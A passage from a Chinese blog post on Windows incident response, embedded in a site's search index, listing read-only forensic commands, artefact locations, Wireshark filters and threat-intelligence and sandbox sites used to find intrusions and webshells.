-<h4 id="使用【netstat】命令进行排查"><a href="#使用【netstat】命令进行排查" class="headerlink" title="使用【netstat】命令进行排查"></a>使用【netstat】命令进行排查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/24.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;ESTABLISHED&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.png"></p>
-<p>ESTABLISHED，含义TCP:连接成功</p>
-<p>如果需要定位筛查具体名称的话，还可以联动tasklist</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如tasklist | find &quot;PID&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -anb 可以查找发起外连的程序，不过需要管理员权限</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get name,parentprocessid,processid /format:csv 这样看起来就简洁一点</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/25.3.png"></p>
-<h3 id="文件痕迹检查"><a href="#文件痕迹检查" class="headerlink" title="文件痕迹检查"></a>文件痕迹检查</h3><blockquote>
-<p>它们告诉我，你曾经存在过。</p>
-</blockquote>
-<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>各个盘下的/temp、/tmp文件夹</p>
-<p>例如c:\windows\system32\inetsrv\MetaBase.<a href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>     #IIS配置文件</p>
-<p>还有就是MySQL，PHP，Apache等等的配置文件，这里不在过多阐述和总结。</p>
-<p>网上有很多现成又详细的总结，这里简单的其他博主的优秀文章。</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_50464560/article/details/119063335">https://blog.csdn.net/weixin_50464560/article/details/119063335</a></p>
-<p><a href="https://blog.csdn.net/lzz710107110/article/details/122386379">https://blog.csdn.net/lzz710107110/article/details/122386379</a></p>
-</blockquote>
-<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>包括但不仅限于：浏览器历史记录、下载文件、cookie信息</p>
-<h4 id="查看用户Recent文件"><a href="#查看用户Recent文件" class="headerlink" title="查看用户Recent文件"></a>查看用户Recent文件</h4><p>访问过的文件夹或文件是有记录的如C:/Documents and Settings\Default User\Recent</p>
-<p>C:/Documents and Settings\用户名\Recent</p>
-<h4 id="查看预读取文件"><a href="#查看预读取文件" class="headerlink" title="查看预读取文件"></a>查看预读取文件</h4><p>Win+R输入【%SystemRoot%\Prefetch】即可发现pf预读取文件</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/28.png"></p>
-<p>另外，Amcache.hve【%SystemRoot%\appcompat\Programs 】文件可查询应用程序的执行路径、上次执行的时间及SHA1值</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/29.png"></p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/30.png"></p>
-<h3 id="时间点查找"><a href="#时间点查找" class="headerlink" title="时间点查找"></a>时间点查找</h3><h4 id="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"><a href="#可列出攻击日期内新增的文件，从而发现相关的恶意软件。" class="headerlink" title="可列出攻击日期内新增的文件，从而发现相关的恶意软件。"></a>可列出攻击日期内新增的文件，从而发现相关的恶意软件。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forfiles /m *.zip /d +2022/5/30 /s /p c:\ /c &quot;cmd /c echo @path @fdate @ftime&quot; 2&gt;null</span><br></pre></td></tr></table></figure>
-
-<p>很好用的命令 就是太长了记不住</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/31.png"></p>
-<h4 id="对文件的创建时间、修改时间、访问时间进行排查"><a href="#对文件的创建时间、修改时间、访问时间进行排查" class="headerlink" title="对文件的创建时间、修改时间、访问时间进行排查"></a>对文件的创建时间、修改时间、访问时间进行排查</h4><p>hacker有时候为了掩人耳目会对时间进行修改，然而这种行为经不起推敲。</p>
-<p>修改时间后，这三种时间会有逻辑上的问题，需要工程师留心注意。</p>
-<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>不能判断哪个是webshell的话就上D盾，上云沙箱</p>
-<p>或者看对外建立的链接，去查ip或者外联传输的情况。</p>
-<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>分为系统日志，安全性日志，应用程序日志</p>
-<p>除了windows系统日志，还可以对中间件日志，ftp日志，数据库日志进行相关分析</p>
-<p>【这些东西有很多，笔者在此不多赘述，大家自行利用搜索引擎收集即可】</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/32.png"></p>
-<h3 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h3><p>分析的话，主要是各种工具的使用，在此不多赘述。</p>
-<p>市面上流行的商业软件都很不错，比如取证大师，火眼，盘古石等。</p>
-<p>当然volatility等也是很优秀的（建议用2版本）</p>
-<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>Wireshark是很棒的分析工具，1、要会抓包 2、要会分析（善用过滤器）简单分享几个我用的比较多的。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.addr == ip    #过滤特定ip</span><br><span class="line">ip.src == ip     #过滤源ip</span><br><span class="line">ip.dst == ip     #过滤目的ip</span><br><span class="line">http、https、smtp、arp等协议直接输入即可筛选</span><br><span class="line">top.sort == 端口号 #对端口号进行过滤</span><br><span class="line">tcp contains xxx   #在数据包中筛查某一关键字</span><br><span class="line">arp.opcode==2     #过滤ARP应答帧</span><br><span class="line">arp.opcode==1     #过滤ARP请求帧</span><br><span class="line">http.response==1 &amp;&amp; http.response.code==200 #响应请求成功的包</span><br><span class="line">tcp.flags.ack==1&amp;&amp;tcp.flags.syn==1   #抓握手包</span><br></pre></td></tr></table></figure>
-
-<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><p>ip和域名网上多查查</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/  #微步平时也要闲着没事逛逛，说不定有意外惊喜呢</span><br><span class="line">https://ti.qianxin.com/   #奇安信威胁情报中心（个人认为做得非常好）</span><br><span class="line">https://ti.nsfocus.com/  #绿盟威胁情报云</span><br><span class="line">https://ti.360.com/#/homepage   #360威胁情报中心</span><br><span class="line">https://exchange.xforce.ibmcloud.com/ #IBM X-Force Exchange</span><br><span class="line">https://whois.chinaz.com/    #站长之家</span><br><span class="line">https://ip138.com/   #ip查询网</span><br><span class="line">http://www.scap.org.cn/   #VULHUB信息安全漏洞门户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>遇见可疑文件有事儿没事儿了多找几个地方上传一下，气死红队（）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.virustotal.com/gui/home/upload  #virustotal</span><br><span class="line">https://s.threatbook.cn/   #微步云沙箱</span><br><span class="line">https://ata.360.cn/     #360安全大脑沙箱云</span><br><span class="line">https://habo.qq.com/  #腾讯哈勃系统</span><br><span class="line">https://sandbox.freebuf.com/detect?theme=freebuf  #大圣云沙箱（有点慢）</span><br></pre></td></tr></table></figure>
-
-<p>总结的内容到这里就要结束了，当然整本书300+页，后面有很多经典案例分享，如挖矿木马，勒索病毒，流量劫持等等。总的来说，是一本非常可读的书，值得想了解应急响应的同学学习一番。这些也有可能给红队的同学一些小启发哟~</p>
-<blockquote>
-<p>若不去改变，明天永远只是今天的重演。</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>蓝队学习之路</category>
-      </categories>
-      <tags>
-        <tag>应急响应</tag>
       </tags>
   </entry>
 </search>
